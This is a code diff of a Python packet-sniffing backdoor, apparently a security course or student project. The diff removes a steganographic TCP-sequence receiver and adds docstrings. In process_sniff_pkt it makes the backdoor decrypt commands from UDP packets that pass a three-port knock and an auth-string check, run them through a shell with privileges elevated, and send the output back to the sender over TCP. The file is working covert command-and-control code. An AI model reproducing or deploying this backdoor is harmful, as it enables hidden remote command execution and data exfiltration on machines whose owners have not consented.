@@ -82,62 +82,12 @@ def read_configuration():
     return configuration
 
 
-def start_receiver():
-    print("Starting Receiver. (Shutdown with Ctrl+C)")
-    configuration = read_configuration()
-    address = configuration['receiver_address']
-    port = configuration['receiver_port']
-    sender_address = configuration['sender_address']
-    global host_address
-    host_address = configuration['receiver_address']
-    encryption.generate_key()
-
-    with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as IPv4_sock:
-        IPv4_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
-        IPv4_sock.bind((address, port))
-        IPv4_sock.listen(10)
-        print("Listening on: ", IPv4_sock.getsockname())
-
-        while True:
-            start_new_thread(stega_receive, (sender_address, port))
-            conn, addr = IPv4_sock.accept()
-
-            while True:
-                data = conn.recv(1024).decode('utf8')
-                if data:
-                    print(f"{conn.getpeername()}: \t{data}")
-                else:
-                    conn.close()
-                    break
-
-
-def stega_receive(address, port):
-    while True:
-        capture = sniff(filter=f"tcp and port {port} and host {address}") # stop_filter=stopfilter
-        data = ""
-        sender = ""
-        for pkt in capture:
-            flags = pkt.payload.payload.flags
-            if flags == "PA":
-                sender = pkt.payload.src
-                stega_data = abs(pkt.payload.payload.seq) % 1000
-                data += chr(stega_data)
-
-        secret_data = encryption.decrypt(data.encode("ascii")).decode("ascii")
-        print(f"({sender}): {data}")
-        print(f"({sender}): {secret_data}")
-
-
-#
-# def stopfilter(x):
-#     global host_address
-#     if x[IP].dst == host_address and x[TCP].flags == "FA":
-#         return True
-#     else:
-#         return False
-
-
 def run_commands(command):
+    """
+    Executes a shell command, then save and returns the output.
+    :param command: str of shell command
+    :return: str of output
+    """
     # result = subprocess.run(['ls', '-l'], capture_output=True, text=True).stdout
     result2 = subprocess.run(command, capture_output=True, text=True, shell=True).stdout
     print(result2)
@@ -145,6 +95,10 @@ def run_commands(command):
 
 
 def start_backdoor():
+    """
+    Initialize the packet sniffing backdoor. Elevate privileges, sets up configurations, and starts sniff.
+    :return: None
+    """
     print("Starting Receiver.")
 
     # Elevate privileges.
@@ -179,6 +133,14 @@ def start_backdoor():
 
 
 def process_sniff_pkt(pkt):
+    """
+    Callback function that processes each packet sniffed for valid backdoor sequence.
+    UDP packets must port knock port 1-3 in config file in the right order, while also containing
+    the auth_string as payload specified in config file.
+    If a valid port knock is detected, decrypt command from payload to execute.
+    :param pkt: scapy packet
+    :return: None
+    """
     global knock_order
 
     ip_dst = pkt.payload.dst
@@ -221,8 +183,10 @@ def process_sniff_pkt(pkt):
         address = pkt.payload.src
         if dst_port == port3 and auth_string == port_knock_auth:
             # print(f"Third knock valid")
-            # print(f"Data: {command}")
-            result = run_commands(command)
+            print(f"Data: {command}")
+            decrypt_cmd = encryption.decrypt(command)
+            print(f"cmd: {decrypt_cmd}")
+            result = run_commands(decrypt_cmd)
             send_command_output(result, address, sender_port)
             knock_order = 0
         else:
@@ -235,6 +199,14 @@ def process_sniff_pkt(pkt):
 
 
 def send_command_output(data, address, port):
+    """
+    Create TCP socket connection to specified address/port and send the string data.
+    :param data: str
+    :param address: dst IP
+    :param port: dst port
+    :return: None
+    """
+
     # Add short delay ensuring sender socket is ready.
     time.sleep(0.5)
 
@@ -248,7 +220,6 @@ def send_command_output(data, address, port):
 if __name__ == "__main__":
     try:
         start_backdoor()
-        # start_receiver()
     except KeyboardInterrupt as e:
         print("Receiver Shutdown")
         exit()
